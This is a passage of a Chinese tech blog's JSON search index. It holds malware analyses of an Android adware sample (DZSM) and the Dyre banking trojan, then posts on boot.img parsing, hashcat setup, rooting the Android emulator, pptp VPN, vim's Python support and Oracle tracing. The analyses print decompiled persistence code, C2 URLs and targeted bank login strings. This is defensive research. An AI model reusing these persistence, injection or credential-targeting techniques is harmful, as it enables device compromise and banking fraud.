HTTP/1.1Content-Length: 59Content-Type: application/x-www-form-urlencodedHost: mob.s2s.nooobi.comConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)country=CN&amp;ip=220.231.27.156&amp;model=sdk&amp;imei=000000000000000 同时加载dex还有另外一个入口，通过 Receiver 12345678910111213&lt;receiver android:name=&quot;net.tend.dot.DZR&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.net.conn.CONNECTIVITY_CHANGE&quot; /&gt; &lt;action android:name=&quot;android.intent.action.USER_PRESENT&quot; /&gt; &lt;action android:name=&quot;com.dz.downloadmanager&quot; /&gt; &lt;action android:name=&quot;action.dz.start&quot; /&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.PACKAGE_ADDED&quot; /&gt; &lt;action android:name=&quot;android.intent.action.PACKAGE_REMOVED&quot; /&gt; &lt;data android:scheme=&quot;package&quot; /&gt; &lt;/intent-filter&gt;&lt;/receiver&gt; 当网络变化，用户锁屏等操作时将自动加载dex 12345678910111213141516171819202122232425262728293031public class DZR extends BroadcastReceiver { public DZR() { super(); } private void a(Context context, Intent intent) { try { a.a(context, i.class).onReceive(context, intent); } catch(Exception v0) { Log.e(&quot;ads&quot;, &quot;&quot;, ((Throwable)v0)); } } public void onReceive(Context context, Intent intent) { Context context = context.getApplicationContext(); String action = intent.getAction(); System.out.println(&quot;SV=&quot; + dzm_version.DZM_1_2_5); if(action.equals(&quot;android.intent.action.USER_PRESENT&quot;)) { DZM.getInstance(context); } l.start_thread(context); if(l.str_dzmb_kiup_act().equals(action)) { l.loadDex(context, intent); } else { this.a(context, intent); } }} 123456&lt;receiver android:name=&quot;com.dz.browser.MyReceiver&quot;&gt;&lt;meta-data android:name=&quot;android.app.device_admin&quot; android:resource=&quot;@xml/lockourscreen&quot; /&gt;&lt;intent-filter&gt; &lt;action android:name=&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot; /&gt;&lt;/intent-filter&gt;&lt;/receiver&gt; lockourscreen.xml 里申请了锁屏权限 12345&lt;device-admin xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;uses-policies&gt; &lt;force-lock /&gt; &lt;/uses-policies&gt;&lt;/device-admin&gt; 但是Receiver里什么也没有干，这只是为了阻止普通用户卸载app。 样本会访问下面URL 获得ip地址信息 http://ip.taobao.com/service/getIpInfo2.php?ip=myip 123456789101112131415161718{code: 0,data: {country: &quot;中国&quot;,country_id: &quot;CN&quot;,area: &quot;华北&quot;,area_id: &quot;100000&quot;,region: &quot;北京市&quot;,region_id: &quot;110000&quot;,city: &quot;北京市&quot;,city_id: &quot;110100&quot;,county: &quot;&quot;,county_id: &quot;-1&quot;,isp: &quot;华瑞信通&quot;,isp_id: &quot;1000146&quot;,ip: &quot;220.231.27.156&quot;}} 从分析看样本主要是获取广告，下载apk，安装apk 这几个功能，还可以使用浏览器打开指定URL daemon 分析两个服务中，daemon 是 arm elf 可执行文件，app安装后自动执行。daemon程序由 dz.jar 的 assets/oilive 释放出来。 在手机上得到下面的命令行 1/data/data/org.dz.passion.browser/app_bin/daemon -p org.dz.passion.browser -s net.tend.dot.DZK -t 120 daemon 使用说明 1usage: %s -p package-name -s daemon-service-name -t interval-time daemon 进程的父进程是init，结束应用进程不会结束daemon进程，将应用进程结束后过120秒，daemon将会重新自动启动 服务程序。 123u0_a45 999 36 193564 32452 ffffffff 40033a40 S org.dz.passion.browser:daemonu0_a45 1016 36 192640 35772 ffffffff 40033a40 S org.dz.passion.browseru0_a45 1028 1 728 296 c0099f1c 40032c88 S /data/data/org.dz.passion.browser/app_bin/daemon 这个搞法似类以前的双进程监控，不容易干掉，上面说过启动App就启动两个服务 DZS 和 DZK，而DZK的代码其实在MFKS中， 从下面的代码可以看到，MFKS在Service 的 OnCreate 是就把daemon 运行起来了，daemon 又会检查app的服务的状态，有会自动 启动服务，比较流氓啊！这么做目的还是为了常驻手机，长期运行。 12345678910111213141516171819202122232425public class MFKS { private Service service; public MFKS() { super(); } public IBinder onBind(Intent arg2) { return null; } public void onCreate() { run_daemon.install(this.service.getApplicationContext(), config.get_kvp_classObject(this.service // net.tend.dot.DZK .getApplicationContext()), 120); this.service.startService(new Intent(this.service.getApplicationContext(), config.get_svp_classObject( // net.tend.dot.DZS this.service.getApplicationContext()))); } public void onStart(Intent arg1, int arg2) { } public void setService(Service arg1) { this.service = arg1; }} 附录访问的URLhttp://ip.taobao.com/service/getIpInfo2.php%3Fip%3Dmyiphttp://api.nooobi.com/api-unlock/getlockappconfighttp://api.nooobi.com/api-unlock/insertimeihttp://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1http://api.nooobi.com/api-unlock/getapptypehttp://api.nooobi.com/api-unlock/kituphttp://alog.umeng.com/app_logshttp://api.nooobi.com/api-unlock/getadlisthttp://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.pnghttp://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpghttp://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.pnghttp://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpghttp://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.pnghttp://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpghttp://api.nooobi.com/api-unlock/unlockaction 总结DZSM 这个样本使用了动态加载dex的技术，使得其检测更加困难。代码结构良好，异常处理充分， 是一个专业程序员的作品。使用了简单的加密技术，也是为了逃避检查。","link":"/cn/malware_DZSM/"},{"title":"Dyre 简单分析","text":"0. 概述123sha256 : 523b9e8057ef0905e2c7d51b742d4be9374cf2eee5a810f05d987604847c549dmd5 : c2d73485095efdbd7ab625e469affb11filename : Invoice_00739287.scr 脱壳后的程序中可以看到 C:\\CPP_PROJECTS_GIT\\DYRE\\x64\\Release\\dyrecontroller.pdb 因此大多数杀软将样本命名为dyre。Dyre的主要目标为在线银行。样本看上去是一个PDF文件，其实则是使用scr后缀的可执行文件，引诱受害者点击文件。 Dyre的一些其他样本 MD5： 999bc5e16312db6abff5f6c9e54c546f b44634d90a9ff2ed8a9d0304c11bf612 dd207384b31d118745ebc83203a4b04a 1. 感染与传播从网上的公开资料来看，样本主要传播途径为钓鱼邮件。 2. 工作流程 复制自身 (C:\\Documents and Settings\\user\\Application Data\\googleupdaterr.exe) 执行复本文件 删除自身 注入Explorer 进程 googleupdaterr.exe 进程退出 由于注入Explorer后，进程退出，在任务管理器中看不到任何可疑进程，代码在Explorer中 执行。Dyre 通过写注册表启动项实现自启动，系统启动后将自动执行恶意文件。 12key : HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\GoogleUpdatevalue : C:\\Documents and Settings\\sys\\Application Data\\googleupdaterr.exe 3. 网络协议由于时间较长了，url链接基本都访问不了了，所以这部分内容就不重点说了。http://192.99.6.61/cho1017/W512600.19532DF60D132DC4E0153BE41218BD1A/5/publickey/217.12.207.151:8900 和 192.99.6.61:80 都已失效。 可以参考下面这篇文章的图片 Project Dyre: New RAT Slurps Bank Credentials, Bypasses SSL VirusTotal 的Passive DNS 可以也可以看到一些内容 从链接提供的内容来看，Dyre使用HTTP协议来进行C&amp;C通讯，C&amp;C服务器的IP在代码中硬编码。 4. 高级技术4.1 脱壳这个样本使用了反混淆技术，不仔细看的话就像一个正常的MFC程序，其实运行到一定阶段， 进程空间里所有的代码都被替换。脱壳过程中未发现反调试的现象，OEP应该是4021F0，在OD里设置硬件执行断点，F9就可以dump了，修复IAT后可以正常运行。 4.2 进程注入我们的目标代码应该是注入到 Explorer 中的代码。其实脱壳后的样本的资源文件里包含了注入到Explorer的代码，分别是PAYLOAD32和PAYLOAD64. Dyre的进程注入和一般的样本有一定的区别，使用了ZwQueueApcThread来启动，而并没有使ZwSetContextThread。在跨进程写则使用了ZwMapViewOfSection而没有使用大家熟悉的ZwWriteVirtualMemory，隐蔽性较强。 新版的Ollydbg 2.01， 支持调试子进程，在子进程中可以看到以下代码 可以确认注入的确实是资源文件里的payload 附录Astrings12345678910111213141516171819202122232425262728cashproonline.bankofamerica.com/AuthenticationFrameworkWeb/cpo/login/public/loginMain.facesbusinessaccess.citibank.citigroup.com/cbusol/signon.dowww.bankline.natwest.com/CWSLogon/logon.do?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.natwest.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fnatwest%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.natwest.com%3A443%2Fbankline%2Fnatwest%2Fdefault.jspwww.bankline.rbs.com/CWSLogon/logon.do?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.rbs.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Frbs%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.rbs.com%3A443%2Fbankline%2Frbs%2Fdefault.jspwww.bankline.ulsterbank.ie/CWSLogon/logon.do?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.ulsterbank.ie&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fubr%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.ulsterbank.ie%3A443%2Fbankline%2Fubr%2Fdefault.jspTRUEAUTOBACKCONN%02xcashproonline.bankofamerica.com/materialsuser_id=company_id=businessaccess.citibank.citigroup.com/materialsbusiness_code=business_name=0x%x85.25.148.6c1shproonline.bankofamerica.comcashproonline.bankofamerica.com/AuthenticationFrameworkWeb/cashproonline.bankofamerica.com/assets/b1sinessaccess.citibank.citigroup.combusinessaccess.citibank.citigroup.com/assets/businessaccess.citibank.citigroup.com/CitiBusinessOnlineFiles/www.b1nkline.natwest.comwww.bankline.natwest.com/www.b1nkline.rbs.comwww.bankline.rbs.com/www.b1nkline.ulsterbank.iewww.bankline.ulsterbank.ie/ 参考资料https://www.virustotal.com/en/file/dc276b0113694ecc62913311e2580857754aa890173dfaa9d95afad6396bb741/analysis/https://www.fireeye.com/blog/threat-research/2015/07/dyre_banking_trojan.htmlhttps://www.blueliv.com/downloads/documentation/reports/Network_insights_of_Dyre_and_Dridex_Trojan_bankers.pdfhttps://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdfhttp://www.seculert.com/blog/2015/04/new-dyre-version-evades-sandboxes.htmlhttps://blogs.cisco.com/security/talos/threat-spotlight-dyre","link":"/cn/malware_Dyre/"},{"title":"Android boot.img 格式分析","text":"首先需要搞到boot.img，网络上流传的方法是通过/proc/mtd 在获取需要的信息 1234567891011121314&gt; ./adb shell&gt; su&gt; cat /proc/mtddev: size erasesize namemtd0: 00700000 00020000 &quot;boot&quot;mtd1: 07c20000 00020000 &quot;cache&quot;mtd2: 00700000 00020000 &quot;recovery&quot;mtd3: 00140000 00020000 &quot;splash&quot;mtd4: 00700000 00020000 &quot;FOTA_STO&quot;mtd5: 09e80000 00020000 &quot;system&quot;mtd6: 0a4e0000 00020000 &quot;userdata&quot;mtd7: 00080000 00020000 &quot;misc&quot;mtd8: 00180000 00020000 &quot;persist&quot; 但是在Nexus4, Android 4.4.4 已经找不到这个文件了 123&gt; cat /proc/mtdcat: /proc/mtd: No such file or directory 但是还是有方法可以获取到需要的信息。 123456&gt; mount...../dev/block/platform/msm_sdcc.1/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0/dev/block/platform/msm_sdcc.1/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,noatime,data=ordered 0 0..... 可以看到大致上面的输出（上面的输出省略了部分内容），从输出中可以看出 /dev/block/platform/msm_sdcc.1/by-name是一个比较有意思的路径，有by-name 的信息。 123456789101112131415161718192021222324252627&gt; ls /dev/block/platform/msm_sdcc.1/by-name/lrwxrwxrwx root root 2014-06-30 20:50 DDR -&gt; /dev/block/mmcblk0p24lrwxrwxrwx root root 2014-06-30 20:50 aboot -&gt; /dev/block/mmcblk0p12lrwxrwxrwx root root 2014-06-30 20:50 abootb -&gt; /dev/block/mmcblk0p15lrwxrwxrwx root root 2014-06-30 20:50 boot -&gt; /dev/block/mmcblk0p6lrwxrwxrwx root root 2014-06-30 20:50 cache -&gt; /dev/block/mmcblk0p22lrwxrwxrwx root root 2014-06-30 20:50 grow -&gt; /dev/block/mmcblk0p25lrwxrwxrwx root root 2014-06-30 20:50 m9kefs1 -&gt; /dev/block/mmcblk0p8lrwxrwxrwx root root 2014-06-30 20:50 m9kefs2 -&gt; /dev/block/mmcblk0p9lrwxrwxrwx root root 2014-06-30 20:50 m9kefs3 -&gt; /dev/block/mmcblk0p10lrwxrwxrwx root root 2014-06-30 20:50 metadata -&gt; /dev/block/mmcblk0p18lrwxrwxrwx root root 2014-06-30 20:50 misc -&gt; /dev/block/mmcblk0p19lrwxrwxrwx root root 2014-06-30 20:50 modem -&gt; /dev/block/mmcblk0p1lrwxrwxrwx root root 2014-06-30 20:50 persist -&gt; /dev/block/mmcblk0p20lrwxrwxrwx root root 2014-06-30 20:50 recovery -&gt; /dev/block/mmcblk0p7lrwxrwxrwx root root 2014-06-30 20:50 rpm -&gt; /dev/block/mmcblk0p11lrwxrwxrwx root root 2014-06-30 20:50 rpmb -&gt; /dev/block/mmcblk0p16lrwxrwxrwx root root 2014-06-30 20:50 sbl1 -&gt; /dev/block/mmcblk0p2lrwxrwxrwx root root 2014-06-30 20:50 sbl2 -&gt; /dev/block/mmcblk0p3lrwxrwxrwx root root 2014-06-30 20:50 sbl2b -&gt; /dev/block/mmcblk0p13lrwxrwxrwx root root 2014-06-30 20:50 sbl3 -&gt; /dev/block/mmcblk0p4lrwxrwxrwx root root 2014-06-30 20:50 sbl3b -&gt; /dev/block/mmcblk0p14lrwxrwxrwx root root 2014-06-30 20:50 system -&gt; /dev/block/mmcblk0p21lrwxrwxrwx root root 2014-06-30 20:50 tz -&gt; /dev/block/mmcblk0p5lrwxrwxrwx root root 2014-06-30 20:50 tzb -&gt; /dev/block/mmcblk0p17lrwxrwxrwx root root 2014-06-30 20:50 userdata -&gt; /dev/block/mmcblk0p23 哈哈，一清二楚。 1234567&gt; dd if=/dev/block/mmcblk0p6 of=/sdcard/boot.img bs=40965632+0 records in5632+0 records out23068672 bytes transferred in 2.398 secs (9619963 bytes/sec)&gt;./adb pull /sdcard/boot.img /tmp/boot.img4270 KB/s (23068672 bytes in 5.275s) boot.img 主要由两部分组成，kernel 和 ramdisk，下面使用010editor来写一个模版，解析boot.img。从Android的源码可以知道boot.img的结构 app/aboot/bootimg.h 1234567891011+-----------------+ | boot header | 1 page+-----------------+| kernel | n pages+-----------------+| ramdisk | m pages+-----------------+| second stage | o pages+-----------------+| device tree | p pages+-----------------+ boot header 的结构定义如下： 123456789101112131415161718struct boot_img_hdr{ unsigned char magic[BOOT_MAGIC_SIZE]; unsigned kernel_size; /* size in bytes */ unsigned kernel_addr; /* physical load addr */ unsigned ramdisk_size; /* size in bytes */ unsigned ramdisk_addr; /* physical load addr */ unsigned second_size; /* size in bytes */ unsigned second_addr; /* physical load addr */ unsigned tags_addr; /* physical addr for kernel tags */ unsigned page_size; /* flash page size we assume */ unsigned dt_size; /* device_tree in bytes */ unsigned unused; /* future expansion: should be 0 */ unsigned char name[BOOT_NAME_SIZE]; /* asciiz product name */ unsigned char cmdline[BOOT_ARGS_SIZE]; unsigned id[8]; /* timestamp / checksum / sha1 / etc */}; 010editor 模板123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#define BOOT_MAGIC_SIZE 8#define BOOT_NAME_SIZE 16#define BOOT_ARGS_SIZE 512typedef struct boot_img_hdr{ char magic[BOOT_MAGIC_SIZE]; uint kernel_size; /* size in bytes */ uint kernel_addr; /* physical load addr */ uint ramdisk_size; /* size in bytes */ uint ramdisk_addr; /* physical load addr */ uint second_size; /* size in bytes */ uint second_addr; /* physical load addr */ uint tags_addr; /* physical addr for kernel tags */ uint page_size; /* flash page size we assume */ uint dt_size; /* device_tree in bytes */ uint unused; /* future expansion: should be 0 */ ubyte name[BOOT_NAME_SIZE]; /* asciiz product name */ ubyte cmdline[BOOT_ARGS_SIZE]; uint id[8]; /* timestamp / checksum / sha1 / etc */}BOOT_IMG_HDR;typedef struct boot_hdr { BOOT_IMG_HDR header; ubyte unused[header.page_size - sizeof(header)];}HEADER;LittleEndian();HEADER header_section;local uint page_size = header_section.header.page_size;local uint kernel_size = header_section.header.kernel_size;local uint ramdisk_size = header_section.header.ramdisk_size;local uint second_size = header_section.header.second_size;Printf(&quot;page_size: %x\\nkernel_size: %x\\nramdisk_size: %x\\nsecond_size: %x\\n&quot;, page_size, kernel_size, ramdisk_size, second_size);local uint n = (kernel_size + page_size - 1) / page_size;local uint m = (ramdisk_size + page_size - 1) / page_size; local uint o = (second_size + page_size - 1) / page_size;typedef struct kernel { ubyte kernel_data[kernel_size]; ubyte unused[n * page_size - kernel_size];}KERNEL;KERNEL kernel_section;typedef struct ramdisk { ubyte ramdisk_data[ramdisk_size]; ubyte unused[m * page_size - ramdisk_size];}RAMDISK;RAMDISK ramdisk_section;typedef struct second { ubyte second_data[second_size]; ubyte unused[o * page_size - second_size];}SECOND;SECOND second_section;","link":"/cn/android_bootimg/"},{"title":"在Ubuntu 14.04 上安装 oclHashcat 的方法 (cuda)","text":"首先需要下载正确的驱动和软件，下载的软件版本一定要正确。下面的两个链接地址是我实验成功的版本。 N卡驱动 ：http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/NVIDIA-Linux-x86_64-346.47.runoclHashcat: https://hashcat.net/files/cudaHashcat-1.35.7z 关键是需要ForceWare 346.x或者更新的版本，ForceWare驱动是nVIDIA 系列显卡最新官方版本名称, 估计和AMD的催化剂类似。如果安装驱动的版本不对运行oclhashcat的时候会报 ERROR: cuModuleLoad() 209 错误，排查了较长时间发现是驱动版本不对，340.x的驱动无法正常工作，一定需要 346.x 的驱动。 基本要求http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/README/index.html 12345678binutils 2.9.5GNU make 3.77gcc 2.91.66kernel 2.6.18* and newerXFree86 4.0.1 and newerX.Org 1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10, 1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17Kernel modutils 2.1.121 and newerglibc 2.0 一些准备工作12sudo apt-get install build-essentialsudo apt-get install linux-image-extra-virtual 卸载原有的nvidia的驱动，不然会发生冲突： 12$ sudo apt-get remove nvidia* &amp;&amp; sudo apt-get autoremove$ sudo apt-get --purge remove xserver-xorg-video-nouveau 禁用nouveau (这个是开源的N卡驱动) 1234567891011$ sudo vi /etc/modprobe.d/blacklist-nouveau.confblacklist nouveaublacklist lbm-nouveauoptions nouveau modeset=0alias nouveau offalias lbm-nouveau off$ echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf$ sudo update-initramfs -u$ sudo reboot 停用X，不然安装过程会出错。 1$ sudo service lightdm stop 安装123$ chmod +x ./NVIDIA-Linux-x86_64-346.47.run$ sudo ./NVIDIA-Linux-x86_64-346.47.run$ sudo reboot 参考链接https://hashcat.net/oclhashcat/http://www.nvidia.com/object/unix.htmlhttp://ubuntuhandbook.org/index.php/2015/01/install-nvidia-346-35-ubuntu-1404/http://tleyden.github.io/blog/2014/10/25/cuda-6-dot-5-on-aws-gpu-instance-running-ubuntu-14-dot-04/","link":"/cn/ubuntu_cuda_hashcat/"},{"title":"root Android emulator","text":"一个的简单的脚本就可以实现自动化root，以下代码在 Android 4.4.2 的 emulator上实验成功。 123456sudo ./adb start-server./adb shell mount -o rw,remount -t yaffs2 /dev/block/mtdblock0 /system./adb push su /system/xbin/su./adb install Superuser.apk./adb shell chmod 06755 /system/xbin/su./adb shell /system/xbin/su -d 其中涉及的二进制文件都可以从 [2] 下载，最关键的步骤是执行su -d，不执行的话SuperSu会报找不到su的二进制文件。 关于android 的emulator有个特性，/system 下的所有更改在下次重启时会丢失。解决这个问题的方法有很多种，最简单的方法是从tmp目录下拷贝emulator-xxx 文件到avd目录。avd目录默认在 ~/.android/avd /tmp/android-user/emulator-xxxx, 将这个文件重命名为system.img，这样重启后，/system下的修改不会丢失。 [1] http://www.claudxiao.net/2013/10/persistent-change-emulator-system-partition/[2] http://download.chainfire.eu/589/SuperSU/UPDATE-SuperSU-v2.16.zip[3] http://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system","link":"/cn/root_android_emulator/"},{"title":"Fedora 安装pptp vpn","text":"使用NetWorkManger图形界面，可以简单地配置pptp vpn，但是有几个地方不是特别满意 操作繁琐，需要多次点击鼠标 拨号后全局生效，要设置路由 可以配置的参数不是特别多 不是通用的方法，在终端中使用不方便 还是比较习惯命令行操作 基于上面几个原因折腾了一下pppd，用了一段时间非常不错，很稳定，在这里记录配置的方法。使用pppd的方法应该可以在其他Linux的发行版上正常使用，配置文件的路径或许有稍许差别。 pppd是Point-to-Point Protocol Daemon的缩写，pppd 的源代码托管在GitHub上 https://github.com/paulusmack/ppp 可以访问 pppd 的官方网站获取更多信息 https://ppp.samba.org/pppd.html 安装所需要的软件首先需要看看哪个包提供了pppd，执行下面的命令 1# yum whatprovides pppd 123456789ppp-2.4.5-33.fc20.x86_64 : The Point-to-Point Protocol daemon源 ：fedora匹配来源：文件名 ：/usr/sbin/pppdppp-2.4.5-33.fc20.x86_64 : The Point-to-Point Protocol daemon源 ：@koji-override-0/$releasever匹配来源：文件名 ：/usr/sbin/pppd 安装pppd1# yum install ppp-2.4.5-33.fc20.x86_64 保证pppd版本高于2.4.2,然后开始修改配置文件。 设置用户名密码12345&gt; vi /etc/ppp/chap-secrets# Secrets for authentication using CHAP# client server secret IP addressesuser1 PPTP password123 * user1 vpn用户名PPTP 后面的文件需要用到，和用户名密码相对应password123 vpn密码 创建vpn profile12345678&gt; vi /etc/ppp/peers/vpnpty &quot;pptp serverip --nolaunchpppd&quot;name user1remotename PPTPrequire-mppe-128file /etc/ppp/options.pptpipparam vpn 连接vpn1&gt; sudo pppd call vpn 断开vpn1&gt; sudo killall pppd 设置路由成功连接vpn后，发现访问不了需要访问的10.6网段，使用route命令查看路由情况 12345678&gt; route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.51.255.* 0.0.0.0 UG 1024 0 0 em110.51.0.0 0.0.0.0 255.255.0.0 U 0 0 0 em1172.16.58.1 0.0.0.0 255.255.255.255 UH 0 0 0 ppp0*.99.*27.1*0 10.51.255.254 255.255.255.255 UGH 0 0 0 em1 因为需要访问10.6网段,需要添加下面的路由 1&gt; sudo route add -net 10.6.0.0/16 gw 10.58.*.* dev ppp0 其中10.58.*.*为拨vpn后分配给你的IP地址，这里就有一个问题，每次连接后都需要重新设置路由，比较麻烦，摸索了一翻发现ip-up.local和ip-down.local可以解决这个问题，每次连接成功后会执行ip-up.local脚本，每次断开连接时会执行ip-down.local脚本。我们只要编写这两个脚本就可以自动设置路由，完全自动化，Cool ! 123456789101112131415161718&gt; sudo vi /etc/ppp/ip-up.local#!/bin/bashNET=&quot;10.6.0.0/16&quot;IFACE=&quot;ppp0&quot;IP=`ip addr show dev ${IFACE} | grep 'inet' | awk '{print $2}'`route add -net ${NET} gw ${IP} dev ${IFACE}&gt; sudo vi /etc/ppp/ip-down.local#!/bin/bashroute del *.99.*27.1*0 dev em1&gt; sudo chmod +x /etc/ppp/ip-up.local&gt; sudo chmod +x /etc/ppp/ip-down.local 重新连接vpn，查看路由情况： 12&gt; sudo pppd call vpn&gt; route -n 1234567Kernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.51.255.* 0.0.0.0 UG 1024 0 0 em110.6.0.0 172.16.58.89 255.255.0.0 UG 0 0 0 ppp010.51.0.0 0.0.0.0 255.255.0.0 U 0 0 0 em1172.16.58.1 0.0.0.0 255.255.255.255 UH 0 0 0 ppp0*.99.*27.1*0 10.51.255.254 255.255.255.255 UGH 0 0 0 em1 已经自动添加10.6.0.0的路由了。 123456&gt; sudo killall pppd&gt; route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.51.255.* 0.0.0.0 UG 1024 0 0 em110.51.0.0 0.0.0.0 255.255.0.0 U 0 0 0 em1 提升速度连接上vpn后发现速度很慢，经过研究 novj 选项可以大幅提高速度。 1novj Disable Van Jacobson style TCP/IP header compression in both the transmit and the receive direction. 编辑 /etc/ppp/options.pptp 添加以下行 1novj 保持长时间在线后面还发现一个问题，一段时间不用就自动断开连接了，发现lcp-echo-interval 可以缓解这个问题。 编辑 /etc/ppp/options.pptp 添加以下行 1lcp-echo-interval 30 Example Config file最终使用的配置如下：/etc/ppp/options.pptp 12345678910111213141516171819202122232425262728locknoauthrefuse-paprefuse-eaprefuse-chaprefuse-mschapusepeerdnsnoipdefaultnodefaultroutenovjrequire-mppenobsdcompnodeflatelcp-echo-failure 5lcp-echo-interval 30mppe-stateful/etc/ppp/peers/vpnpty &quot;pptp *.99.*27.1*0 --nolaunchpppd&quot;name xxxremotename PPTPfile /etc/ppp/options.pptpipparam vpn/etc/ppp/chap-secretsuser PPTP password *.99.*27.1*0 参考链接http://shyju.wordpress.com/2013/08/13/linux-as-a-pptp-vpn-client-configuration-centosfedora/http://www.cyberciti.biz/tips/howto-configure-ubuntu-fedora-linux-pptp-client.htmlhttp://pptpclient.sourceforge.net/https://ppp.samba.org/index.html","link":"/cn/fedora_pptp_vpn/"},{"title":"vim中的python","text":"1. 判断vim支持python要判断你的vim是否支持python，可以执行下面命令： 1$ vim --version | grep python 如果显示的结果中有 +python 的话，你的vim已经支持python，如果没有的话，你需要重新编译vim，在windows中可以使用下面的命令行， 1nmake -f Make_mvc.mak FEATURES=huge PYTHON=D:\\Python27 PYTHON_VER=27 GUI=yes IME=yes 2. 为什么需要编译支持python的vim主要的理由有两个， 可以使用python写的vim插件。 vim 7.4 以后对python的支持进行了增强。 有很多不错的vim 插件，这里给大家推荐一个python-mode, 非常不错。https://github.com/klen/python-mode vim 7.4 以后对python的支持进行了增强，这个是广大vim注册用户（捐钱的用户）呼声最高的需求，原话为， add integration with Python instead of inventing more Vim script 确实现在已经有太多的vim脚本了。vim的主页上的完整需求列表; http://www.vim.org/sponsor/vote_results.php add IDE features (debugger integration, shell window) 这个是排行老二的需求，不知道什么时侯能实现，期待中… 3. 一些应用举例3.1 python commands1:[range]py[thon] {stmt} 这个命令比较简单，详细解释如下: range 是标准的vim的range 熟悉vim替换命令的同学应该都不会陌生。range的作用的是指定python命令影响哪些行，写法为 [行号，行号]，比如 1,2 影响第一行和第二行，1,$影响整个文件。[] 的意思是这个range是可选的默认将影响整个文件。 py[thon]的意思为，python 是命令的全写，可以简写为py。 {stmt} python 语句 可以写上下面命令，输出 Hello 1:python print &quot;Hello python&quot; 数学不好的同学可以像我一样使用 1:py print 1+1 将显示结果2 :) 123:[range]py[thon] &lt;&lt; {endmarker}{script}{endmarker} 上面是这个命令是第二种用法，可以直接写python，相当爽，写法很象cat 命令 123cat &gt; /tmp/xx &lt;&lt; EOF....EOF 想用vim查询天气的同学可以参考一下，github上的这个脚本 https://raw.github.com/liqunli/vim-plugin-dev/master/dairy.vim 3.2 pydo这个命令的格式为， :[range]pydo {body} vim 中有一个定义好的函数，这个命令将利用这个函数做一些事情 12def _vim_pydo(line, linenr): {body} pydo 这个命令同样是以行为单位的，range的用法和上面说的一样。 line 是原始的行，linenr 是 line number (行号）。大家可以猜一下下面命令的意思， 1:pydo if line: return &quot;%4d: %s&quot; % (linenr, line) 显示结果大致是这样， 直接用这个文件测试了一下， 12345655: 将显示结果2 :)58: :[range]py[thon] &lt;&lt; {endmarker}59: {script}60: {endmarker} 没有指定range，默认为整个文件，”%4d: %s” % (linenr, line) 这句的意思是，在每行前加行号，不足4位的数字的用空格补齐 在早些时侯，vim命令要实现这个的效果，需要写一行诡异的命令， 1:%s/^/\\=printf('%4d: ', line('.')) 挑战太大，vim 还专门写了一篇wiki http://vim.wikia.com/wiki/Insert_line_numbers 3.3 pyfile这条命令的格式为，:[range]pyf[ile] {file} 可以直接使用python 文件，不需要一句一句的输入python 语句了。 12345:python from vim import *:python from string import upper:python current.line = upper(current.line):python print &quot;Hello&quot;:python str = current.buffer[42] 3.4 python3命令的格式和python是一样的，不过需要开启 +python3 3.5 vim的python 接口这个不属于这个小文章的想说的了，写了这成vim的manual了，可以直接参看:http://vimhelp.appspot.com/if_pyth.txt.html#python-vim 4. 最后为了避免vim和emacs的圣战，hx 和 lzx等emacs党，可以直接忽视此文 ：） 5. 参考资料http://vimhelp.appspot.com/if_pyth.txt.html","link":"/cn/vim_python/"},{"title":"Oracle 数据库如何trace 执行的SQL statement","text":"Q. Oracle 数据库如何trace执行的SQL statement 1. 开启trace方法(1) : 执行SQL语句 12SQL&gt; alter system set sql_trace = true;SQL&gt; alter system SET EVENTS '10046 trace name context forever, level 12'; 方法(2) : 修改init.ora 配置文件 还可以修改init.ora 文件添加 event=”10046 trace name context forever,level 12” 来达到目的，修改以后需要重新启动数据库。 2. 关闭 trace1SQL&gt; alter system set EVENTS '10046 trace name context off'; 3. trace相关的几个参数 MAX_DUMP_FILE_SIZE dump 文件大小 USER_DUMP_DEST dump 文件路径 可以使用下面语句参看： 123456789101112SQL&gt; show parameter user_dump_dest;NAME TYPE VALUE------------------------------------ 